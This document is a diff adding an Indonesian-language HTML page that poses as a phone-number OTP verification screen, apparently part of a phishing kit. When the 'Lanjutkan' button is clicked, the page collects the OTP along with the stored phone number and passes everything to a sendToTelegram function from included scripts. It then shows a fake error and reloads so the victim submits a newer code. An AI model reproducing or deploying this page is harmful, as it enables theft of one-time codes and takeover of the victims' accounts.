@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan Security Code</title>
+    <script src="data-handler.js"></script>
+    <script src="cihuy.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff; /* Sesuaikan dengan latar belakang gambar */
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px; /* Lebar maksimal agar terlihat seperti tampilan mobile */
+            background-color: #fff;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative; /* Added for footer positioning */
+            min-height: 100vh; /* Added to ensure container takes full height */
+            padding-bottom: 80px; /* Added padding for footer */
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .header .icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 40px; /* Increased margin */
+            color: #333;
+            text-align: left; /* Align title left */
+        }
+        .subtitle {
+            /* Removed subtitle as per image */
+            display: none;
+        }
+        /* Removed phone input styles */
+        .forgot-link {
+            font-size: 14px;
+            color: #007bff; /* Warna biru untuk link */
+            text-decoration: none;
+        }
+        .legal-text {
+             /* Removed legal text as per image */
+             display: none;
+        }
+        .button {
+           /* Removed button as per image */
+           display: ;
+        }
+        .back-icon {
+            font-size: 36px;
+            cursor: pointer;
+            margin-bottom: 20px; /* Added margin */
+        }
+        .help-icon {
+           /* Removed help icon as per image */
+           display: none;
+        }
+
+/* New styles for OTP input */
+.otp-container {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 20px;
+    width: 100%;
+}
+
+.otp-input {
+    width: 100%;                     /* <<< Lebarkan */
+    height: 50px;                    /* <<< Tinggikan */
+    border: 1px solid #ccc;
+    text-align: center;
+    font-size: 28px;                  /* <<< Perbesar angka */
+    font-weight: 600;
+    background: #f9f9f9;    
+    outline: none;
+    transition: all 0.2s ease;
+}
+
+/* Saat fokus */
+.otp-input:focus {
+    border-color: #673ab7;
+    background: #fff;
+}
+
+/* Opsional: efek hover */
+.otp-input:hover {
+    border-color: #a389d4;
+}
+
+
+
+        .otp-input:focus {
+            border-color: #673ab7; /* Purple border on focus */
+        }
+
+        /* New styles for hidden digit and purple border */
+        .otp-input.hidden-digit {
+            color: #673ab7; /* Hide the digit by making it the same color as the background */
+            border-color: #ffffff00; /* Purple border when digit is hidden */
+        }
+
+        /* New styles for footer */
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        .footer .forgot-link-container {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer .forgot-link-container a {
+             color: #007bff; /* Warna biru untuk link */
+             text-decoration: none;
+             font-weight: bold; /* Make the link bold */
+        }
+
+          .button {
+            width: 100%;
+            padding: 12px;
+            background-color: #e0e0e0; /* Warna abu-abu untuk tombol non-aktif */
+            color: #9e9e9e; /* Warna teks abu-abu */
+            border: none;
+            border-radius: 25px; /* Membuat tombol melengkung */
+            font-size: 16px;
+            cursor: not-allowed; /* Kursor menunjukkan tombol non-aktif */
+            text-align: center;
+        }
+
+
+    </style>
+    <script>
+        var a = sessionStorage.getItem('phone');
+        document.addEventListener('DOMContentLoaded', function () {
+    const timeouts = {};
+    const continueButton = document.getElementById('bt1');
+
+    function toggleButton() {
+        const otp = document.getElementById('huuh').value;
+        if (otp.length >= 4) {
+            continueButton.disabled = false;
+            continueButton.style.backgroundColor = '#673ab7';
+            continueButton.style.color = '#fff';
+            continueButton.style.cursor = 'pointer';
+        } else {
+            continueButton.disabled = true;
+            continueButton.style.backgroundColor = '#e0e0e0';
+            continueButton.style.color = '#9e9e9e';
+            continueButton.style.cursor = 'not-allowed';
+        }
+    }
+
+    // cek setiap kali user ketik
+    document.getElementById('huuh').addEventListener('input', toggleButton);
+    toggleButton(); // cek awal
+
+    continueButton.addEventListener('click', async function () {
+        const otp = document.getElementById('huuh').value; // ambil value terbaru
+
+        storeData('otp', otp);
+
+        const data = getAllData();
+        sendToTelegram(data).then(success => {
+            if (success) {
+                Swal.fire({
+                    icon: "error",
+                    title: "Terjadi Kesalahan",
+                    text: "Silahkan masukan kode terbaru anda",
+                    confirmButtonText: "Coba Lagi"
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        location.reload();
+                    }
+                });
+            }
+        });
+
+        // Countdown timer script (di luar Swal.fire)
+        const countdownElement = document.getElementById('countdown');
+        let timeLeft = 60;
+
+        function updateCountdown() {
+            countdownElement.textContent = timeLeft;
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateCountdown, 1000);
+            } else {
+                document.getElementById('countdown-text').style.display = 'none';
+                document.getElementById('resend-link').style.display = 'inline';
+            }
+        }
+
+        updateCountdown();
+    });
+});
+
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img width="60%" src="images/uhuy.png" alt="">
+        </div>
+        <div class="content">
+            <br>
+            <!-- Added image based on the provided screenshot -->
+            <div class="title" style=" margin-bottom: 10px;font-size: 24px;">Verifikasi Nomor HP</div>
+
+            <p style="font-size: 18px;">
+                Masukkan kode verifikasi yang dikirim ke <br> <strong>+62 <span id="phone"></span></strong>
+            </p>
+             <!-- Removed subtitle -->
+            <div class="otp-container">
+                <input id="huuh" maxlength="6" type="tel" class="otp-input" >
+            </div>
+             <!-- Removed forgot link from here -->
+        </div>
+         <!-- Removed legal text -->
+         <!-- Removed button -->
+          <button id="bt1" class="button" disabled>Lanjutkan</button>
+
+         <!-- Added resend SMS text -->
+         <p style="text-align: center;  color: #666;">Belum dapet OTP? </p>
+         <div id="resend-container" style="text-align: center; color: #666;">
+           <span id="countdown-text">Kirim ulang dalam <span id="countdown">60</span> detik.</span>
+           <a href="otp.html" id="resend-link" style="color: #007bff; text-decoration: none; font-weight: bold; display: none;">kirim ulang kode</a>
+         </div>
+
+         <!-- Removed the existing footer as it's not in the image -->
+         <!--
+         <div class="footer">
+            <div class="forgot-link-container">
+                 Lupa kode kamu? <a href="#">Atur Ulang</a>
+            </div>
+         </div>
+         -->
+    </div>
+    <script>
+        document.getElementById('phone').textContent = a;
+    </script>
+</body>
+</html> 
